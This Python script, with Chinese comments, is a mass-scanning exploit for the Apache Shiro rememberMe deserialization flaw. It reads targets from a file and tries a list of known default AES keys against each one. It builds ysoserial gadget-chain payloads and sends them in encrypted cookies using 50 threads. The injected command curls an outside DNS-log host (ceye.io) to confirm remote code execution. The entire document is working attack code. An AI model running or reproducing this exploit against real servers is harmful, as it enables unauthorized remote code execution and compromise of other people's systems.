# -*- coding: utf-8 -*-
import os
import base64
import uuid
import subprocess
import requests
from Crypto.Cipher import AES
import threading
from concurrent.futures import ThreadPoolExecutor
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
#py3.7


# 可以是绝对路径 也可以是相对路径
#JAR_FILE = 'ysoserial-0.0.6-SNAPSHOT-BETA-all.jar'
JAR_FILE = 'ysoserial.jar'

plugins = ['CommonsBeanutils1','CommonsCollections1','CommonsCollections2','CommonsCollections3','CommonsCollections4','CommonsCollections5','CommonsCollections6','CommonsCollections7','CommonsCollections8','CommonsCollections9','CommonsCollections10']
keys = ['kPH+bIxk5D2deZiIxcaaaA==',
'wGiHplamyXlVB11UXWol8g==',
'2AvVhdsgUs0FSA3SDFAdag==',
'4AvVhmFLUs0KTA3Kprsdag==',
'3AvVhmFLUs0KTA3Kprsdag==',
'Z3VucwAAAAAAAAAAAAAAAA==',
'U3ByaW5nQmxhZGUAAAAAAA==',
'wGiHplamyXlVB11UXWol8g==',
'6ZmI6I2j5Y+R5aSn5ZOlAA==',
'fCq+/xW488hMTCD+cmJ3aQ==',
'1QWLxg+NYmxraMoxAXu/Iw==',
'ZUdsaGJuSmxibVI2ZHc9PQ==',
'L7RioUULEFhRyxM7a2R/Yg==',
'r0e3c16IdVkouZgk1TKVMg==',
'ZWvohmPdUsAWT3=KpPqda',
'5aaC5qKm5oqA5pyvAAAAAA==',
'bWluZS1hc3NldC1rZXk6QQ==',
'a2VlcE9uR29pbmdBbmRGaQ==',
'WcfHGU25gNnTxTlmJMeSpw==',
'LEGEND-CAMPUS-CIPHERKEY==',
'bWljcm9zAAAAAAAAAAAAAA==',
'MTIzNDU2Nzg5MGFiY2RlZg==',
'5AvVhmFLUs0KTA3Kprsdag==']

dnslog = 'xxxxx.ceye.io'

mutex = threading.Lock()
pool = ThreadPoolExecutor(max_workers=50)
def poc(url):
    target = url.strip()
    r = requests.get(target, cookies={'rememberMe': '1'}, timeout=3, verify=False, allow_redirects=False)  # 发送验证请求
    if 'deleteMe' not in r.headers['Set-Cookie']:
        print("[-]没有启用rememberMe--" + target)
        return False
    for plugin in plugins:
        for key in keys:
            en_url = base64.b64encode(target.encode('utf-8')).decode()
            emae = ('curl http://'+plugin+'.'+key+'.'+en_url+'.')
            try:
                payload = generator(JAR_FILE,plugin,key,emae+dnslog)  # 生成payload
                print(payload.decode())
                r = requests.get(target, cookies={'rememberMe': payload.decode()}, timeout=2,verify=False)  # 发送验证请求
                print("[+]成功发送数据包--" + target)
            except:
                print("[-]发送数据包失败--" + target)
                break
    return False

def generator(fp,plugin,key,command):
    if not os.path.exists(fp):
        raise Exception('jar file not found!')
    popen = subprocess.Popen(['java', '-jar', fp, plugin, command],
                             stdout=subprocess.PIPE)
    BS = AES.block_size
    pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()
    mode = AES.MODE_CBC
    iv = uuid.uuid4().bytes
    encryptor = AES.new(base64.b64decode(key), mode, iv)
    file_body = pad(popen.stdout.read())
    base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))
    return base64_ciphertext

if __name__ == '__main__':
    fr = open('./url.txt','r')
    for url in fr.readlines():
        print(url)
        pool.submit(poc,url)
    fr.close()
